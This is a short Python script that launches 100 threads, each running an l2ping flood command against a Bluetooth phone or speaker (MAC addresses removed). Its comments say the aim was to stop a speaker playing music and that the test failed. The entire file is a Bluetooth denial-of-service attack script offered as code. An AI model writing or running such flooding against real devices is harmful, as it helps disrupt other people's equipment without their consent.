#This python has to be ran on a linux machine with l2ping
#testing spamming ping commands to the phone and to the bluetooth speaker while the speaker was playing music to stop the music playing
#test: failed
import subprocess
import threading

#Mac addresses removed for privacy and security reasons
#cmd =['l2ping', '-i', 'hci0', '-s', '500', '-f', '-c', '1000', ''] # speaker
cmd =['l2ping', '-i', 'hci0', '-s', '500', '-f', '-c', '1000', ''] # phone

def runCommand():
    subprocess.call(cmd)
    
for i in range(0,100):
    thread = threading.Thread(target=runCommand)
    thread.start()